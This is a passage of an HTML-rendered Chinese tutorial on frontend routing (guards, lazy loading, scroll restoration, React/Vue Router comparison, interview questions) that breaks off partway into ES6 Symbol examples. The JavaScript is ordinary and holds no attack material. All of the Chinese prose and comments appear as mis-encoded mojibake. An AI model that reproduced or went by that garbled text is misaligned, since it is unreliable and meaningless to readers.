class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">hook</span> =&gt;</span> <span class="hljs-title function_">hook</span>(to, <span class="hljs-keyword">from</span>));<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (to === <span class="hljs-string">&#x27;/admin&#x27;</span> &amp;&amp; !<span class="hljs-title function_">isAdmin</span>()) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;/login&#x27;</span>; <span class="hljs-comment">// é‡å®šå‘</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="è·¯ç”±æ€§èƒ½ä¼˜åŒ–ç­–ç•¥"><a href="#è·¯ç”±æ€§èƒ½ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="è·¯ç”±æ€§èƒ½ä¼˜åŒ–ç­–ç•¥"></a>è·¯ç”±æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</h2><p><strong>è·¯ç”±æ‡’åŠ è½½</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> routes = &#123;<br>  <span class="hljs-string">&#x27;/dashboard&#x27;</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Dashboard.js&#x27;</span>),<br>  <span class="hljs-string">&#x27;/admin&#x27;</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AdminPanel.js&#x27;</span>)<br>&#125;;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRouting</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> path = location.<span class="hljs-property">pathname</span>;<br>  <span class="hljs-keyword">const</span> loader = routes[path];<br>  <br>  <span class="hljs-keyword">if</span> (loader) &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loader</span>();<br>    <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">render</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±é¢„åŠ è½½</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¼ æ ‡æ‚¬åœæ—¶é¢„åŠ è½½</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;a&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">link</span> =&gt;</span> &#123;<br>  link.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mouseenter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> path = link.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (routes[path]) &#123;<br>      routes[path]().<span class="hljs-title function_">preload</span>();<br>    &#125;<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ»šåŠ¨è¡Œä¸ºç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// ä»å†å²è®°å½•æ¢å¤æ»šåŠ¨ä½ç½®</span><br>  <span class="hljs-keyword">const</span> scrollPos = history.<span class="hljs-property">state</span>?.<span class="hljs-property">scrollPosition</span> || [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>];<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(...scrollPos);<br>&#125;);<br><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// è®°å½•æ»šåŠ¨ä½ç½®</span><br>  history.<span class="hljs-title function_">replaceState</span>(<br>    &#123; ...history.<span class="hljs-property">state</span>, <span class="hljs-attr">scrollPosition</span>: [<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollX</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>] &#125;,<br>    <span class="hljs-string">&#x27;&#x27;</span>,<br>    to<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="è·¯ç”±åº“å®ç°å¯¹æ¯”"><a href="#è·¯ç”±åº“å®ç°å¯¹æ¯”" class="headerlink" title="è·¯ç”±åº“å®ç°å¯¹æ¯”"></a>è·¯ç”±åº“å®ç°å¯¹æ¯”</h2><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">åŸç”Ÿå®ç°</th><th align="left">React Router</th><th align="left">Vue Router</th></tr></thead><tbody><tr><td align="left">è·¯ç”±æ¨¡å¼</td><td align="left">æ‰‹åŠ¨å®ç°</td><td align="left">æ”¯æŒhash&#x2F;history</td><td align="left">æ”¯æŒhash&#x2F;history&#x2F;abstract</td></tr><tr><td align="left">åµŒå¥—è·¯ç”±</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left">è·¯ç”±å®ˆå«</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left">åŠ¨æ€è·¯ç”±</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left">æ‡’åŠ è½½</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left">æ»šåŠ¨è¡Œä¸º</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left">TypeScript</td><td align="left">éœ€æ‰‹åŠ¨é…ç½®</td><td align="left">âœ…</td><td align="left">âœ…</td></tr></tbody></table><h2 id="é¢è¯•å¸¸è§é—®é¢˜åˆ†æ"><a href="#é¢è¯•å¸¸è§é—®é¢˜åˆ†æ" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜åˆ†æ"></a>é¢è¯•å¸¸è§é—®é¢˜åˆ†æ</h2><p><strong>Qï¼šHashæ¨¡å¼å’ŒHistoryæ¨¡å¼å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p><ul><li>ä¼˜å…ˆé€‰æ‹©Historyæ¨¡å¼ï¼ˆæ›´å‹å¥½çš„URLã€æ›´å¥½çš„SEOæ”¯æŒï¼‰</li><li>éœ€è¦å…¼å®¹IE9æˆ–ä»¥ä¸‹æ—¶ä½¿ç”¨Hashæ¨¡å¼</li><li>æ— åç«¯æ§åˆ¶æƒæ—¶ä½¿ç”¨Hashæ¨¡å¼ï¼ˆå¦‚é™æ€æ‰˜ç®¡ï¼‰</li></ul><p><strong>Qï¼šä¸ºä»€ä¹ˆHistoryæ¨¡å¼éœ€è¦æœåŠ¡å™¨é…ç½®ï¼Ÿ</strong></p><p>å½“ç”¨æˆ·ç›´æ¥è®¿é—®&#x2F;dashboardç­‰å­è·¯å¾„æ—¶ï¼ŒæœåŠ¡å™¨éœ€è¦è¿”å›å•é¡µåº”ç”¨çš„å…¥å£æ–‡ä»¶ï¼ˆindex.htmlï¼‰ï¼Œè€Œä¸æ˜¯å°è¯•æŸ¥æ‰¾ä¸å­˜åœ¨çš„&#x2F;dashboard.htmlæ–‡ä»¶ã€‚</p><p><strong>Qï¼šå¦‚ä½•è§£å†³è·¯ç”±å‚æ•°å˜åŒ–ç»„ä»¶ä¸åˆ·æ–°çš„é—®é¢˜ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">Route</span> <br>  path=<span class="hljs-string">&quot;/user/:id&quot;</span> <br>  component=&#123;<span class="hljs-title class_">User</span>&#125; <br>  key=&#123;location.<span class="hljs-property">pathname</span>&#125; <span class="hljs-comment">// å¼ºåˆ¶é‡æ–°æŒ‚è½½</span><br>/&gt;<br><br><span class="hljs-comment">// æˆ–ç›‘å¬å‚æ•°å˜åŒ–</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// å½“idå˜åŒ–æ—¶é‡æ–°è·å–æ•°æ®</span><br>  <span class="hljs-title function_">fetchUserData</span>(params.<span class="hljs-property">id</span>);<br>&#125;, [params.<span class="hljs-property">id</span>]);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•å®ç°è·¯ç”±è¿‡æ¸¡åŠ¨ç”»ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vue</span><br>&lt;template&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fade&quot;</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&quot;out-in&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span></span><br>&lt;/template&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-class">.fade-enter-active</span>, <span class="hljs-selector-class">.fade-leave-active</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-class">.fade-enter</span>, <span class="hljs-selector-class">.fade-leave-to</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// React</span><br><span class="hljs-comment">// src/components/RouteTransition.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">CSSTransition</span>, <span class="hljs-title class_">TransitionGroup</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-transition-group&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useLocation, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteTransition</span> = (<span class="hljs-params">&#123; children &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TransitionGroup</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">CSSTransition</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;location.key&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">timeout</span>=<span class="hljs-string">&#123;300&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">classNames</span>=<span class="hljs-string">&quot;fade&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&#123;location&#125;</span>&gt;</span></span><br><span class="language-xml">          &#123;children&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">CSSTransition</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">TransitionGroup</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RouteTransition</span>;<br><br><span class="hljs-comment">// src/App.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">RouteTransition</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/RouteTransition&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./pages/Home&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./pages/About&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">RouteTransition</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">About</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">RouteTransition</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å‰ç«¯è·¯ç”±æ˜¯ç°ä»£SPAåº”ç”¨çš„æ ¸å¿ƒåŸºç¡€è®¾æ–½ï¼Œç†è§£å…¶åŸç†éœ€è¦æŒæ¡ï¼š</p><ul><li>ä¸¤ç§è·¯ç”±æ¨¡å¼çš„åº•å±‚å®ç°æœºåˆ¶</li><li>History API çš„è¯¦ç»†ç”¨æ³•</li><li>åŠ¨æ€è·¯ç”±åŒ¹é…ç®—æ³•</li><li>è·¯ç”±ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ˆå¯¼èˆªå®ˆå«ï¼‰</li><li>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥ï¼ˆæ‡’åŠ è½½ã€é¢„åŠ è½½ï¼‰</li><li>æœ€ä½³å®è·µé€‰æ‹©ï¼ˆæ¨¡å¼é€‰æ‹©ã€å‚æ•°å¤„ç†ï¼‰</li></ul><p>åœ¨é¢è¯•ä¸­å›ç­”è·¯ç”±é—®é¢˜æ—¶ï¼Œå»ºè®®ç»“åˆå…·ä½“åœºæ™¯ï¼š</p><ul><li>è§£é‡Šæ ¸å¿ƒåŸç†æ—¶ä½¿ç”¨æŠ€æœ¯æœ¯è¯­ï¼ˆpopstate&#x2F;hashchangeï¼‰</li><li>å¯¹æ¯”ä¸åŒå®ç°æ–¹æ¡ˆæ—¶è¯´æ˜å–èˆåŸå› </li><li>è§£å†³å®é™…é—®é¢˜æ—¶å±•ç¤ºä¼˜åŒ–æ„è¯†</li><li>æåˆ°ä¸»æµè·¯ç”±åº“æ—¶åˆ†æå…¶è®¾è®¡å“²å­¦</li></ul><h1 id="ES6-Symbol"><a href="#ES6-Symbol" class="headerlink" title="ES6+ Symbol"></a>ES6+ Symbol</h1><h2 id="å®šä¹‰ä¸æè¿°"><a href="#å®šä¹‰ä¸æè¿°" class="headerlink" title="å®šä¹‰ä¸æè¿°"></a>å®šä¹‰ä¸æè¿°</h2><p>Symbol æ˜¯ ES6 æ–°å¼•å…¥çš„ä¸€ç§åŸå§‹æ•°æ®ç±»å‹ï¼Œè¡¨ç¤ºç‹¬ä¸€æ— äºŒçš„å€¼ï¼ŒSymbol çš„ä¸»è¦ç”¨é€”æ˜¯åˆ›å»ºå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºå¯¹è±¡å±æ€§çš„é”®ï¼Œä»¥é¿å…å±æ€§åå†²çªã€‚</p><h2 id="åˆ›å»ºä¸ä½¿ç”¨"><a href="#åˆ›å»ºä¸ä½¿ç”¨" class="headerlink" title="åˆ›å»ºä¸ä½¿ç”¨"></a>åˆ›å»ºä¸ä½¿ç”¨</h2><p><strong>åŸºç¡€åˆ›å»º</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ— æè¿°åˆ›å»º</span><br><span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>();<br><br><span class="hljs-comment">// å¸¦æè¿°åˆ›å»ºï¼ˆä»…ç”¨äºè°ƒè¯•ï¼‰</span><br><span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;description&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sym2.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// &quot;Symbol(description)&quot;</span><br></code></pre></td></tr></table></figure><p><strong>å…¨å±€æ³¨å†Œè¡¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºæˆ–è·å–å…¨å±€ Symbol</span><br><span class="hljs-keyword">const</span> globalSym = <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;global_key&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">keyFor</span>(globalSym)); <span class="hljs-comment">// &quot;global_key&quot;</span><br><br><span class="hljs-comment">// è·¨æ¨¡å—è®¿é—®</span><br><span class="hljs-comment">// module1.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>);<br><br><span class="hljs-comment">// module2.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="æ ¸å¿ƒç‰¹æ€§"><a href="#æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="æ ¸å¿ƒç‰¹æ€§"></a>æ ¸å¿ƒç‰¹æ€§</h2><p><strong>å”¯ä¸€æ€§</strong></p><p>æ¯ä¸ª Symbol çš„å€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œå³ä½¿å®ƒä»¬æœ‰ç›¸åŒçš„æè¿°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> s1 = <span class="hljs-title class_">Symbol</span>();<br><span class="hljs-keyword">const</span> s2 = <span class="hljs-title class_">Symbol</span>();<br>s1 === s2 <span class="hljs-comment">// false</span><br><br><span class="hljs-keyword">const</span> s3 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br><span class="hljs-keyword">const</span> s4 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br>s3 === s4 <span class="hljs-comment">// falseï¼ˆå³ä½¿æè¿°ç›¸åŒï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>å€¼ä¸å¯ä¿®æ”¹</strong></p><p>Symbol å€¼ä¸€æ—¦åˆ›å»ºä¸å¯è¢«ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;unique&#x27;</span>);<br><span class="hljs-comment">// æ²¡æœ‰ä»»ä½•æ–¹æ³•å¯ä»¥æ”¹å˜ sym çš„å€¼</span><br>sym.<span class="hljs-property">description</span> = <span class="hljs-string">&#x27;changed&#x27;</span>; <span class="hljs-comment">// é™é»˜å¤±è´¥ï¼ˆéä¸¥æ ¼æ¨¡å¼ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>ä¸å¯æšä¸¾æ€§</strong></p><p>å½“ä½¿ç”¨ Symbol å€¼ä½œä¸ºå¯¹è±¡å±æ€§é”®æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹å¸¸è§„æ–¹æ³•ï¼ˆå¦‚ <code>for...in</code>ï¼Œ<code>Object.keys()</code>ï¼‰ä¸­ä¸å¯è§ï¼Œä½†å¯ä»¥é€šè¿‡ <code>Object.getOwnPropertySymbols()</code> å’Œ <code>Reflect.ownKeys()</code> è·å–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;key&#x27;</span>)]: <span class="hljs-string">&#x27;value&#x27;</span>,<br>  <span class="hljs-attr">normalKey</span>: <span class="hljs-string">&#x27;normal&#x27;</span><br>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// åªè¾“å‡º &quot;normalKey&quot;</span><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// [&quot;normalKey&quot;]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj)); <span class="hljs-comment">// &#123;&quot;normalKey&quot;:&quot;normal&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šè¿ç®—</strong></p><p>Symbol ç±»å‹çš„å€¼ä¸èƒ½ä¸å…¶ä»–ç±»å‹çš„å€¼è¿›è¡Œè¿ç®—ï¼Œä¼šæŠ¥é”™ï¼Œä½† Symbol å€¼å¯ä»¥è½¬ä¸ºå­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>s + <span class="hljs-string">&#x27;world&#x27;</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-string">`<span class="hljs-subst">$&#123;s&#125;</span> world`</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-title class_">Number</span>(s) <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br>s + <span class="hljs-number">2</span> <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br></code></pre></td></tr></table></figure><h2 id="å†…ç½®çš„-Symbol-å€¼"><a href="#å†…ç½®çš„-Symbol-å€¼" class="headerlink" title="å†…ç½®çš„ Symbol å€¼"></a>å†…ç½®çš„ Symbol å€¼</h2><p>JavaScript å†…ç½®çš„ Symbol å±æ€§å¯ä»¥ç”¨äºä¿®æ”¹è¯­è¨€çš„å†…éƒ¨è¡Œä¸º</p><p><strong>Symbol.hasInstance - è‡ªå®šä¹‰ instanceof è¡Œä¸º</strong></p><p>å¯¹è±¡çš„ Symbol.hasInstance å±æ€§æŒ‡å‘ä¸€ä¸ªå†…éƒ¨æ–¹æ³•ï¼Œå½“å…¶ä»–å¯¹è±¡ä½¿ç”¨ instanceof è¿ç®—ç¬¦åˆ¤æ–­æ˜¯å¦ä¸ºè¯¥å¯¹è±¡çš„å®ä¾‹æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªå†…éƒ¨æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObj</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](obj) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span 